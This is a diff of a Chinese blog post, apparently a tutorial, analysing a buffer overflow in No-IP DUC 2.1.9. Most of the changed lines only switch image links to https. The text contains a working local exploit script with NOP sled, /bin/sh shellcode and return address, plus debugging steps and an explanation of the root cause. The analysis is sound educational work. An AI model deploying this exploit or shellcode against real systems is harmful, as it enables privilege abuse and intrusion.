@@ -21,24 +21,24 @@
 <meta property="og:url" content="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/index.html">
 <meta property="og:site_name" content="Star">
 <meta property="og:description" content="溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。exploit db POC">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg">
-<meta property="og:updated_time" content="2016-03-28T14:19:21.459Z">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg">
+<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg">
+<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg">
+<meta property="og:updated_time" content="2017-02-19T10:37:13.459Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析">
 <meta name="twitter:description" content="溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。exploit db POC">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
+<meta name="twitter:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
 
   
 
@@ -200,18 +200,18 @@
 <li>os.system(“%s -i %s%s%s” % (binary, nop*nop_slide, shellcode, eip_addr))<br> 执行命令 ./noip-2.1.9-1/binaries/noip2-i686 -i agrs</li>
 <li>参数：nop<em>nop_slide + shellcode + eip_addr<br> 即 “\x90”</em>251 + shellcode + eip_addr</li>
 </ul>
-<h2 id="③运行-POC"><a href="#③运行-POC" class="headerlink" title="③运行 POC"></a>③运行 POC</h2><p>在 kali 下直接运行 POC：<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg" alt=""><br>说明 shellcode 成功执行。</p>
+<h2 id="③运行-POC"><a href="#③运行-POC" class="headerlink" title="③运行 POC"></a>③运行 POC</h2><p>在 kali 下直接运行 POC：<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg" alt=""><br>说明 shellcode 成功执行。</p>
 <h1 id="III、调试程序"><a href="#III、调试程序" class="headerlink" title="III、调试程序"></a>III、调试程序</h1><h2 id="①-计算返回地址偏移"><a href="#①-计算返回地址偏移" class="headerlink" title="① 计算返回地址偏移"></a>① 计算返回地址偏移</h2><p>推荐使用 pattern.py 脚本进行计算。<br><strong>1、构造唯一字符串</strong><br>命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./pattern<span class="selector-class">.py</span> <span class="number">350</span></div></pre></td></tr></table></figure></p>
 <p>构造长度为 350 的字符串<br><strong>2、使用此参数运行程序</strong><br>命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">edb --run ./NO-IP/noip<span class="number">-2.1</span><span class="number">.9</span><span class="number">-1</span>/binaries/noip2-i686 -i <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al"</span></div></pre></td></tr></table></figure></p>
-<p>结果：<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg" alt=""><br><strong>3、计算偏移</strong><br>命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern<span class="selector-class">.py</span> <span class="number">0</span>x396a4138</div></pre></td></tr></table></figure></p>
-<p>结果<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg" alt=""></p>
+<p>结果：<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg" alt=""><br><strong>3、计算偏移</strong><br>命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern<span class="selector-class">.py</span> <span class="number">0</span>x396a4138</div></pre></td></tr></table></figure></p>
+<p>结果<br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg" alt=""></p>
 <p>则shellcode可构造为：nops + shellcode + ip_addr，其中 nops + shellcode 长度为 296。</p>
 <h2 id="②-构造-exploit"><a href="#②-构造-exploit" class="headerlink" title="② 构造 exploit"></a>② 构造 exploit</h2><h3 id="1、初始-exploit"><a href="#1、初始-exploit" class="headerlink" title="1、初始 exploit"></a>1、初始 exploit</h3><p>根据上述分析，构造如下 exploit<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"></div><div class="line">p = ''</div><div class="line">p += "<span class="symbol">\x</span>90" * 251</div><div class="line">p += "<span class="symbol">\x</span>eb<span class="symbol">\x</span>1f<span class="symbol">\x</span>5e<span class="symbol">\x</span>89<span class="symbol">\x</span>76<span class="symbol">\x</span>08<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>88<span class="symbol">\x</span>46<span class="symbol">\x</span>07<span class="symbol">\x</span>89<span class="symbol">\x</span>46<span class="symbol">\x</span>0c<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b"</div><div class="line">p += "<span class="symbol">\x</span>89<span class="symbol">\x</span>f3<span class="symbol">\x</span>8d<span class="symbol">\x</span>4e<span class="symbol">\x</span>08<span class="symbol">\x</span>8d<span class="symbol">\x</span>56<span class="symbol">\x</span>0c<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>db<span class="symbol">\x</span>89<span class="symbol">\x</span>d8<span class="symbol">\x</span>40<span class="symbol">\x</span>cd"</div><div class="line">p += "<span class="symbol">\x</span>80<span class="symbol">\x</span>e8<span class="symbol">\x</span>dc<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff/bin/sh"</div><div class="line"></div><div class="line">p += "aaaa"</div><div class="line"></div><div class="line">print p</div></pre></td></tr></table></figure></p>
 <h3 id="2、调试程序，定位出错点"><a href="#2、调试程序，定位出错点" class="headerlink" title="2、调试程序，定位出错点"></a>2、调试程序，定位出错点</h3><p><strong>（1）、edb 命令：</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">edb --run ./NO-IP/noip<span class="number">-2.1</span><span class="number">.9</span><span class="number">-1</span>/binaries/noip2-i686 -i <span class="string">"`./NO-IP/exploit.py`"</span></div></pre></td></tr></table></figure></p>
 <p><strong>（2）、定位</strong></p>
 <ul>
 <li>F10 运行程序</li>
-<li>F8 一路单步执行程序，直到溢出<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg" alt=""></li>
+<li>F8 一路单步执行程序，直到溢出<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg" alt=""></li>
 </ul>
 <p>说明，在 0x08049aef 处 call 0x0804bfec 出错</p>
 <p><strong>（3）、继续定位</strong><br>再次使用 edb 命令调试，并在 0x80049aef 处下断点，进入函数内部执行。</p>
@@ -220,28 +220,28 @@
 <li>F10 运行程序</li>
 <li>再次 F10 运行到断点处</li>
 <li>F7 进入函数内部</li>
-<li>F8 一路单步执行，直到函数返回前<br> <img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg" alt=""></li>
+<li>F8 一路单步执行，直到函数返回前<br> <img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg" alt=""></li>
 </ul>
-<p><strong>（4）、首次试验</strong><br><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg" alt=""></p>
+<p><strong>（4）、首次试验</strong><br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg" alt=""><br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg" alt=""></p>
 <p>才发现，这个程序的栈、堆都是可执行的，简直不能忍！！！！！</p>
 <p>ip_addr 换成 shellcode 起始地址 0xbffff34f。<br>nops(251) + payload + 0xbffff34f<br>可是发现执行出断错。因为执行shellcode之后，程序继续没有正常退出，继续执行，会报错。</p>
 <h3 id="3、查看堆"><a href="#3、查看堆" class="headerlink" title="3、查看堆"></a>3、查看堆</h3><p>既然栈和堆都是可执行的，payload 在栈中，执行不成功，查看堆。<br>原始 POC 中的 ip_addr = 0x080573bc也在堆中，查看此地址附近的堆内容。</p>
-<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg" alt=""></p>
+<p><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg" alt=""></p>
 <p>ip_addr = 0x080573bc 正好是 shellcode 在堆中的起始地址。</p>
 <p>OK，shellcode 构造好了。<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"></div><div class="line">p = ''</div><div class="line">p += "<span class="symbol">\x</span>90" * 251</div><div class="line">p += "<span class="symbol">\x</span>eb<span class="symbol">\x</span>1f<span class="symbol">\x</span>5e<span class="symbol">\x</span>89<span class="symbol">\x</span>76<span class="symbol">\x</span>08<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>88<span class="symbol">\x</span>46<span class="symbol">\x</span>07<span class="symbol">\x</span>89<span class="symbol">\x</span>46<span class="symbol">\x</span>0c<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b"</div><div class="line">p += "<span class="symbol">\x</span>89<span class="symbol">\x</span>f3<span class="symbol">\x</span>8d<span class="symbol">\x</span>4e<span class="symbol">\x</span>08<span class="symbol">\x</span>8d<span class="symbol">\x</span>56<span class="symbol">\x</span>0c<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>db<span class="symbol">\x</span>89<span class="symbol">\x</span>d8<span class="symbol">\x</span>40<span class="symbol">\x</span>cd"</div><div class="line">p += "<span class="symbol">\x</span>80<span class="symbol">\x</span>e8<span class="symbol">\x</span>dc<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff/bin/sh"</div><div class="line"></div><div class="line">p += "<span class="symbol">\x</span>bc<span class="symbol">\x</span>73<span class="symbol">\x</span>05<span class="symbol">\x</span>08"</div><div class="line"></div><div class="line">print p</div></pre></td></tr></table></figure></p>
-<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg" alt=""></p>
+<p><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg" alt=""></p>
 <p>分析到此处，对于了解缓冲区溢出的人，都能理解 exploit db 中 POC 的构成了。<br>以下是分析漏洞成因。</p>
 <h1 id="IV、漏洞成因"><a href="#IV、漏洞成因" class="headerlink" title="IV、漏洞成因"></a>IV、漏洞成因</h1><p>堆和栈中都有 shellcode<br>shellcode 在堆中的起始地址：0x080573bc<br>在栈中的起始地址：0xbffff5bc</p>
 <p>在调试程序过程中，一直观察 0x080573bc 和 0xbffff5bc 的变化</p>
 <h2 id="①-堆的变化"><a href="#①-堆的变化" class="headerlink" title="① 堆的变化"></a>① 堆的变化</h2><p>在 0x08049898 处 call 0x08049b65，将 shellcode 拷贝到堆中</p>
-<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg" alt=""></p>
+<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg" alt=""></p>
 <p>call 0x08049b65 之前的 mov 指令是设置参数<br>ebp + 12（0xbffff43c，参数起始地址的地址） 的值存放到 esp + 4<br>ebp + 8 （参数个数）的值存放到 esp </p>
-<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg" alt=""></p>
+<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg" alt=""></p>
 <p>栈中查看 0xbffff43c 的值为 0xbffff58d<br>内存中查看 0xbffff58d 处，命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“ 的起始地址处。</p>
 <p>因此，此代码段的作用是，将命令拷贝到堆 0x080573bc 处。</p>
 <h2 id="②-栈的变化"><a href="#②-栈的变化" class="headerlink" title="② 栈的变化"></a>② 栈的变化</h2><p>在 0x0804c050 处 call 0x08049348，将堆中的 shellcode 拷贝到栈中。</p>
-<p>call 执行之前<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg" alt=""></p>
-<p>call 执行之后<br><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg" alt=""></p>
+<p>call 执行之前<br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg" alt=""></p>
+<p>call 执行之后<br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg" alt=""></p>
 <p>call 0x08049348 有三个参数，分别存放于 esp,exp+4,esp+8<br>将 exp+4(&amp;ip=%s) 和 esp+8(堆中shellcode的起始地址)  拷贝到栈 0xbffff250 处。</p>
 <h2 id="③-漏洞成因"><a href="#③-漏洞成因" class="headerlink" title="③ 漏洞成因"></a>③ 漏洞成因</h2><ul>
 <li>输入命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“,没有对参数进行边界检查</li>
